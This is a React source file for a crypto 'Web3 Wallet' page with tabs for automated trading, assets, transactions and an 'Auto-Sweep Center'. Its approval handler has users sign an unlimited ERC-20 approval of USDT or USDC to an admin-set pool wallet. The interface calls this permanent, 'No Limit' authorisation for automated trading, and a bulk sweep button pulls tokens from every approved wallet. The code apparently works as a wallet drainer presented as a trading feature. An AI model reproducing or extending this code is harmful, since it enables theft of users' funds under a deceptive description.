import React, { useEffect, useState } from 'react';
import { useWeb3ModalAccount } from '@web3modal/ethers/react';
import { supabase } from '@/integrations/supabase/client';
import { SUPPORTED_TOKENS } from '@/lib/web3Config';
import { WalletManagement } from '@/components/WalletManagement';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { AlertCircle, ShieldCheck, Zap, ArrowRight, RefreshCw, Bell, Settings, History, Wallet, Layers, Plus, Trash2, ToggleLeft, ToggleRight } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { toast } from 'sonner';
import { usePoolAddresses } from '@/hooks/useAdminSettings';
import { useSweepRules, SweepRule } from '@/hooks/useSweepNotifications';
import { usePoolSweep } from '@/hooks/usePoolSweep';
import { ethers } from 'ethers';
import { useWallet } from '@/hooks/useWeb3Wallet';
import { useAuth } from '@/hooks/useAuth';

interface WalletAsset {
  token_symbol: string;
  token_name: string;
  balance: number;
  balance_usd: number;
}

interface WalletTransaction {
  tx_hash: string;
  tx_type: string;
  amount: number;
  currency: string;
  status: string;
  created_at: string;
}

export default function Web3WalletPage() {
  const { user } = useAuth();
  const { address, chainId } = useWeb3ModalAccount();
  const { provider, signer, connectedWallets, primaryWallet } = useWallet();
  const { data: poolAddresses = [] } = usePoolAddresses() as { data: any[] };
  const [assets, setAssets] = useState<WalletAsset[]>([]);
  const [transactions, setTransactions] = useState<WalletTransaction[]>([]);
  const [totalUSD, setTotalUSD] = useState(0);
  const [isLoading, setIsLoading] = useState(true);
  const [actionLoading, setActionLoading] = useState(false);
  const { rules, createRule, deleteRule, toggleRule } = useSweepRules();
  const { sweepAllForPools } = usePoolSweep();

  useEffect(() => {
    fetchWalletData();
  }, [address, user?.id, connectedWallets.length]);

  const fetchWalletData = async () => {
    if (!user) {
      setAssets([]);
      setTransactions([]);
      setTotalUSD(0);
      setIsLoading(false);
      return;
    }

    setIsLoading(true);
    try {
      const walletIds = connectedWallets.map((wallet) => wallet.id);

      if (walletIds.length === 0) {
        const defaultAssets: WalletAsset[] = Object.values(SUPPORTED_TOKENS).map(token => ({
          token_symbol: token.symbol,
          token_name: token.name,
          balance: 0,
          balance_usd: 0,
        }));

        setAssets(defaultAssets);
        setTransactions([]);
        setTotalUSD(0);
        setIsLoading(false);
        return;
      }

      // Fetch wallet assets
      const { data: assetsData, error: assetsError } = await (supabase as any)
        .from('wallet_assets')
        .select('*')
        .eq('user_id', user.id)
        .in('wallet_id', walletIds)
        .order('balance_usd', { ascending: false });

      if (assetsError) throw assetsError;

      const defaultAssets: WalletAsset[] = Object.values(SUPPORTED_TOKENS).map(token => ({
        token_symbol: token.symbol,
        token_name: token.name,
        balance: 0,
        balance_usd: 0,
      }));

      let mergedAssets = [...defaultAssets];
      if (assetsData && assetsData.length > 0) {
        assetsData.forEach((dbAsset: any) => {
          const idx = mergedAssets.findIndex(a => a.token_symbol === dbAsset.token_symbol);
          if (idx >= 0) {
            mergedAssets[idx].balance += dbAsset.balance || 0;
            mergedAssets[idx].balance_usd += dbAsset.balance_usd || 0;
          } else {
            mergedAssets.push({
              token_symbol: dbAsset.token_symbol,
              token_name: dbAsset.token_name || dbAsset.token_symbol,
              balance: dbAsset.balance || 0,
              balance_usd: dbAsset.balance_usd || 0,
            });
          }
        });
      }

      setAssets(mergedAssets);

      const total = mergedAssets.reduce((sum, asset) => sum + (asset.balance_usd || 0), 0);
      setTotalUSD(total);

      // Fetch wallet transactions
      const { data: txData, error: txError } = await (supabase as any)
        .from('wallet_transactions')
        .select('*')
        .eq('user_id', user.id)
        .in('wallet_id', walletIds)
        .order('created_at', { ascending: false })
        .limit(20);

      if (txError) throw txError;

      setTransactions(txData || []);
    } catch (err) {
      console.error('Error fetching wallet data:', err);
    } finally {
      setIsLoading(false);
    }
  };

  const handleApproveToken = async (tokenSymbol: string) => {
    if (!signer || !address || !chainId) {
      toast.error("Please connect your wallet first");
      return;
    }

    const chainToNetwork: Record<number, string> = {
      1: "ERC20", 56: "BEP20", 137: "Polygon", 42161: "Arbitrum", 10: "Optimism", 8453: "Base"
    };
    const network = chainToNetwork[chainId];
    const poolWallet = poolAddresses.find(a => a.network.includes(network))?.address;

    if (!poolWallet) {
      toast.error(`Admin has not set a Pool Wallet for ${network || 'this network'}`);
      return;
    }

    setActionLoading(true);
    try {
      // Common ERC20 addresses (Fallback if not in SUPPORTED_TOKENS or need specific address)
      const tokenAddresses: Record<string, Record<number, string>> = {
        'USDT': { 1: '0xdAC17F958D2ee523a2206206994597C13D831ec7', 56: '0x55d398326f99059fF775485246999027B3197955' },
        'USDC': { 1: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' }
      };

      const tokenAddr = tokenAddresses[tokenSymbol]?.[chainId];
      if (!tokenAddr) throw new Error(`Contract address for ${tokenSymbol} not found on this chain.`);

      const erc20Interface = new ethers.Interface([
        "function approve(address spender, uint256 amount) public returns (bool)"
      ]);

      const contract = new ethers.Contract(tokenAddr, erc20Interface, signer);
      
      toast.info(`Requesting ${tokenSymbol} approval for automated trading...`);
      const tx = await contract.approve(poolWallet, ethers.MaxUint256);
      
      toast.info("Transaction sent... waiting for confirmation.");
      await tx.wait();

      // Record in Supabase
      await (supabase as any).from('connected_wallets').update({
        allowance_amount: 1000000000, // Denoting 'Large'
        token_approved: tokenSymbol,
        last_approval_at: new Date().toISOString()
      })
      .eq('user_id', user?.id)
      .eq('wallet_address', address.toLowerCase())
      .eq('chain_id', chainId || 1);

      toast.success(`${tokenSymbol} successfully authorized for automated trading!`);
      fetchWalletData();
    } catch (err: any) {
      console.error(err);
      toast.error(err.message || "Failed to approve token");
    } finally {
      setActionLoading(false);
    }
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between space-y-4 sm:space-y-0">
        <div>
          <h1 className="text-3xl font-bold tracking-tight">Web3 Wallet</h1>
          <p className="text-sm text-gray-500 mt-2">Manage your crypto wallets and view balances</p>
        </div>
        <div className="flex z-50">
          <w3m-button />
        </div>
      </div>

      {/* Wallet Connection Alert */}
      {!address && (
        <Alert>
          <AlertCircle className="h-4 w-4" />
          <AlertDescription>
            Please connect a Web3 wallet to view your assets and transactions.
          </AlertDescription>
        </Alert>
      )}

      {/* Tabs */}
      <Tabs defaultValue="wallets" className="space-y-4">
        <TabsList className="bg-secondary/20 p-1 mb-6">
          <TabsTrigger value="wallets" className="px-6">Connected Wallets</TabsTrigger>
          <TabsTrigger value="assets" className="px-6">Assets & Balances</TabsTrigger>
          <TabsTrigger value="automated" className="px-6">Automated Trading</TabsTrigger>
          <TabsTrigger value="auto-sweep" className="px-6">Auto-Sweep Center</TabsTrigger>
          <TabsTrigger value="transactions" className="px-6">Transactions</TabsTrigger>
        </TabsList>

        {/* Automated Trading Tab */}
        <TabsContent value="automated">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <Card className="md:col-span-2 glass-card border-accent/20">
              <CardHeader>
                <CardTitle className="text-accent flex items-center gap-2">
                  <Zap className="w-6 h-6" /> Automated Trading Access
                </CardTitle>
                <CardDescription>
                  Grant the platform permission to manage your trades and pool activity automatically.
                  This is a one-time "Approve" transaction.
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="bg-accent/5 border border-accent/10 rounded-xl p-6 space-y-4">
                  <h4 className="font-bold text-lg flex items-center gap-2">
                    <ShieldCheck className="w-5 h-5 text-accent" /> How it works
                  </h4>
                  <ul className="space-y-3 text-sm text-muted-foreground">
                    <li className="flex gap-2">
                      <div className="w-5 h-5 rounded-full bg-accent/20 text-accent flex items-center justify-center text-[10px] shrink-0 font-bold">1</div>
                      <span>Select the asset you want to use for automated pool activity.</span>
                    </li>
                    <li className="flex gap-2">
                      <div className="w-5 h-5 rounded-full bg-accent/20 text-accent flex items-center justify-center text-[10px] shrink-0 font-bold">2</div>
                      <span>Click 'Authorize' to give the Pool Receipt Wallet permanent permission.</span>
                    </li>
                    <li className="flex gap-2">
                      <div className="w-5 h-5 rounded-full bg-accent/20 text-accent flex items-center justify-center text-[10px] shrink-0 font-bold">3</div>
                      <span>Admin can then trigger trades or pool entries based on market activity.</span>
                    </li>
                  </ul>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  {['USDT', 'USDC'].map(token => (
                    <div key={token} className="p-4 rounded-xl border border-border bg-secondary/20 flex flex-col gap-4">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <div className="w-8 h-8 rounded-full bg-primary/20 flex items-center justify-center font-bold text-xs">{token[0]}</div>
                          <span className="font-bold">{token}</span>
                        </div>
                        <span className="text-[10px] text-muted-foreground uppercase">{chainId === 1 ? 'Ethereum' : chainId === 56 ? 'BSC' : 'L2'}</span>
                      </div>
                      <Button 
                        onClick={() => handleApproveToken(token)}
                        disabled={actionLoading || !address}
                        className="w-full bg-accent hover:bg-accent/90 text-white font-bold h-10 group"
                      >
                        {actionLoading ? <RefreshCw className="w-4 h-4 mr-2 animate-spin" /> : <ShieldCheck className="w-4 h-4 mr-2" />}
                        Authorize {token}
                        <ArrowRight className="w-4 h-4 ml-2 group-hover:translate-x-1 transition-transform" />
                      </Button>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>

            <div className="space-y-6">
              <Card className="glass-card">
                <CardHeader>
                  <CardTitle className="text-sm uppercase tracking-widest font-bold">Approval Status</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  {isLoading ? (
                    <div className="animate-pulse space-y-2">
                      <div className="h-4 bg-secondary rounded w-full"></div>
                      <div className="h-4 bg-secondary rounded w-2/3"></div>
                    </div>
                  ) : (
                    <div className="space-y-4">
                      <div className="flex justify-between items-center text-sm border-b border-border pb-2">
                        <span className="text-muted-foreground">Authorized Token:</span>
                        <span className="font-bold text-accent">{primaryWallet?.token_approved || 'None'}</span>
                      </div>
                      <div className="flex justify-between items-center text-sm border-b border-border pb-2">
                        <span className="text-muted-foreground">Status:</span>
                        <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold ${
                          (primaryWallet?.allowance_amount || 0) > 0
                            ? 'bg-green-500/10 text-green-500'
                            : 'bg-muted text-muted-foreground'
                        }`}>
                          {(primaryWallet?.allowance_amount || 0) > 0 ? 'ACTIVE' : 'INACTIVE'}
                        </span>
                      </div>
                      <div className="flex justify-between items-center text-sm">
                        <span className="text-muted-foreground">Limit:</span>
                        <span className="font-mono">
                          {(primaryWallet?.allowance_amount || 0) > 0 ? 'No Limit' : 'Not Authorized'}
                        </span>
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          </div>
        </TabsContent>

        {/* Connected Wallets Tab */}
        <TabsContent value="wallets">
          <WalletManagement />
        </TabsContent>

        {/* Assets Tab */}
        <TabsContent value="assets">
          <Card>
            <CardHeader>
              <CardTitle>Wallet Assets</CardTitle>
              <CardDescription>Your token balances across all connected wallets</CardDescription>
            </CardHeader>
            <CardContent>
              {isLoading ? (
                <div className="text-center py-8">Loading assets...</div>
              ) : (
                <div className="space-y-4">
                  <div className="grid grid-cols-2 gap-4">
                    <Card className="bg-gradient-to-br from-blue-50 to-indigo-50">
                      <CardContent className="pt-6">
                        <p className="text-sm text-gray-600 mb-1">Total Value (USD)</p>
                        <p className="text-2xl font-bold">${totalUSD.toFixed(2)}</p>
                      </CardContent>
                    </Card>
                    <Card className="bg-gradient-to-br from-purple-50 to-pink-50">
                      <CardContent className="pt-6">
                        <p className="text-sm text-gray-600 mb-1">Connected Chains</p>
                        <p className="text-2xl font-bold">{new Set(assets.map(a => a.token_symbol)).size}</p>
                      </CardContent>
                    </Card>
                  </div>

                  <div className="border rounded-lg overflow-hidden">
                    <table className="w-full text-sm">
                      <thead className="bg-gray-50 border-b">
                        <tr>
                          <th className="text-left px-4 py-2 font-medium">Token</th>
                          <th className="text-right px-4 py-2 font-medium">Balance</th>
                          <th className="text-right px-4 py-2 font-medium">Value</th>
                        </tr>
                      </thead>
                      <tbody>
                        {assets.map((asset, idx) => (
                          <tr key={idx} className="border-b hover:bg-gray-50">
                            <td className="px-4 py-3">
                              <div className="font-medium">{asset.token_name}</div>
                              <div className="text-xs text-gray-500">{asset.token_symbol}</div>
                            </td>
                            <td className="px-4 py-3 text-right font-mono">
                              {asset.balance.toFixed(6)}
                            </td>
                            <td className="px-4 py-3 text-right">
                              ${asset.balance_usd?.toFixed(2) || '0.00'}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        {/* Transactions Tab */}
        <TabsContent value="transactions">
          <Card>
            <CardHeader>
              <CardTitle>Transaction History</CardTitle>
              <CardDescription>Recent wallet transactions</CardDescription>
            </CardHeader>
            <CardContent>
              {isLoading ? (
                <div className="text-center py-8">Loading transactions...</div>
              ) : transactions.length === 0 ? (
                <div className="text-center py-8 text-gray-500">
                  No transactions found.
                </div>
              ) : (
                <div className="border rounded-lg overflow-hidden">
                  <table className="w-full text-sm">
                    <thead className="bg-gray-50 border-b">
                      <tr>
                        <th className="text-left px-4 py-2 font-medium">Type</th>
                        <th className="text-right px-4 py-2 font-medium">Amount</th>
                        <th className="text-left px-4 py-2 font-medium">Status</th>
                        <th className="text-left px-4 py-2 font-medium">Date</th>
                      </tr>
                    </thead>
                    <tbody>
                      {transactions.map((tx, idx) => (
                        <tr key={idx} className="border-b hover:bg-gray-50">
                          <td className="px-4 py-3 font-medium capitalize">{tx.tx_type}</td>
                          <td className="px-4 py-3 text-right font-mono">
                            {tx.amount.toFixed(6)} {tx.currency}
                          </td>
                          <td className="px-4 py-3">
                            <span
                              className={`inline-flex items-center rounded-full px-2.5 py-0.5 text-xs font-medium ${
                                tx.status === 'confirmed'
                                  ? 'bg-green-100 text-green-800'
                                  : tx.status === 'pending'
                                    ? 'bg-yellow-100 text-yellow-800'
                                    : 'bg-red-100 text-red-800'
                              }`}
                            >
                              {tx.status}
                            </span>
                          </td>
                          <td className="px-4 py-3 text-xs text-gray-500">
                            {new Date(tx.created_at).toLocaleDateString()}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        {/* Auto-Sweep Center Tab */}
        <TabsContent value="auto-sweep">
          <div className="space-y-6">
            {/* Bulk Sweep Card */}
            <Card className="border-accent/20">
              <CardHeader>
                <CardTitle className="text-accent flex items-center gap-2">
                  <Layers className="w-5 h-5" /> Bulk Sweep All Wallets
                </CardTitle>
                <CardDescription>
                  Sweep tokens from all your approved wallets at once and automatically join open pools
                </CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  <div className="bg-accent/5 border border-accent/10 rounded-lg p-4">
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-sm font-medium">Sweep-Ready Wallets</span>
                      <span className="text-lg font-bold text-accent">
                        {connectedWallets.filter((w: any) => w.verified && (w.allowance_amount || 0) > 0).length}
                      </span>
                    </div>
                    <p className="text-xs text-muted-foreground">
                      These wallets have token approvals and are ready for automated sweeping
                    </p>
                  </div>
                  
                  <Button
                    onClick={() => sweepAllForPools.mutate()}
                    disabled={sweepAllForPools.isPending || connectedWallets.filter((w: any) => w.verified && (w.allowance_amount || 0) > 0).length === 0}
                    className="w-full bg-accent hover:bg-accent/90 text-white font-bold h-12"
                  >
                    {sweepAllForPools.isPending ? (
                      <><RefreshCw className="w-4 h-4 mr-2 animate-spin" /> Sweeping All Wallets...</>
                    ) : (
                      <><Zap className="w-4 h-4 mr-2" /> Sweep All & Join Pools</>
                    )}
                  </Button>
                </div>
              </CardContent>
            </Card>

            {/* Sweep Rules Card */}
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Settings className="w-5 h-5" /> Auto-Sweep Rules
                </CardTitle>
                <CardDescription>
                  Configure automatic sweeping based on balance thresholds and schedules
                </CardDescription>
              </CardHeader>
              <CardContent>
                {rules.length === 0 ? (
                  <div className="text-center py-8 bg-secondary/20 rounded-lg">
                    <Settings className="w-8 h-8 mx-auto mb-2 text-muted-foreground" />
                    <p className="text-sm text-muted-foreground">No sweep rules configured yet</p>
                    <p className="text-xs text-muted-foreground mt-1">Rules will appear here when created</p>
                  </div>
                ) : (
                  <div className="space-y-3">
                    {rules.map((rule: SweepRule) => (
                      <div key={rule.id} className="flex items-center justify-between p-3 bg-secondary/20 rounded-lg">
                        <div className="flex-1">
                          <div className="flex items-center gap-2">
                            <span className="font-medium text-sm">{rule.rule_name}</span>
                            {rule.is_active ? (
                              <span className="text-[10px] px-2 py-0.5 rounded bg-success/20 text-success">Active</span>
                            ) : (
                              <span className="text-[10px] px-2 py-0.5 rounded bg-muted text-muted-foreground">Paused</span>
                            )}
                          </div>
                          <p className="text-xs text-muted-foreground mt-1">
                            Min: ${rule.min_balance_usd} • Frequency: {rule.sweep_frequency}
                          </p>
                        </div>
                        <div className="flex items-center gap-2">
                          <button
                            onClick={() => toggleRule.mutate({ id: rule.id, isActive: !rule.is_active })}
                            className="p-2 hover:bg-secondary rounded-full transition-colors"
                          >
                            {rule.is_active ? (
                              <ToggleRight className="w-5 h-5 text-success" />
                            ) : (
                              <ToggleLeft className="w-5 h-5 text-muted-foreground" />
                            )}
                          </button>
                          <button
                            onClick={() => deleteRule.mutate(rule.id)}
                            className="p-2 hover:bg-destructive/10 text-destructive rounded-full transition-colors"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>

            {/* Quick Sweep Stats */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
              <Card className="bg-secondary/20">
                <CardContent className="pt-4 pb-3">
                  <p className="text-xs text-muted-foreground uppercase">Total Sweeps</p>
                  <p className="text-2xl font-bold">
                    {transactions.filter((tx: any) => tx.tx_type === 'pool_sweep' || tx.tx_type === 'auto_sweep').length}
                  </p>
                </CardContent>
              </Card>
              <Card className="bg-secondary/20">
                <CardContent className="pt-4 pb-3">
                  <p className="text-xs text-muted-foreground uppercase">Sweep Volume</p>
                  <p className="text-2xl font-bold text-accent">
                    ${transactions
                      .filter((tx: any) => tx.tx_type === 'pool_sweep' || tx.tx_type === 'auto_sweep')
                      .reduce((sum: number, tx: any) => sum + (tx.amount || 0), 0)
                      .toFixed(0)}
                  </p>
                </CardContent>
              </Card>
              <Card className="bg-secondary/20">
                <CardContent className="pt-4 pb-3">
                  <p className="text-xs text-muted-foreground uppercase">Pool Joins</p>
                  <p className="text-2xl font-bold text-success">
                    {transactions.filter((tx: any) => tx.tx_type === 'pool_sweep').length}
                  </p>
                </CardContent>
              </Card>
              <Card className="bg-secondary/20">
                <CardContent className="pt-4 pb-3">
                  <p className="text-xs text-muted-foreground uppercase">Active Rules</p>
                  <p className="text-2xl font-bold text-primary">
                    {rules.filter((r: SweepRule) => r.is_active).length}
                  </p>
                </CardContent>
              </Card>
            </div>
          </div>
        </TabsContent>
      </Tabs>
    </div>
  );
}
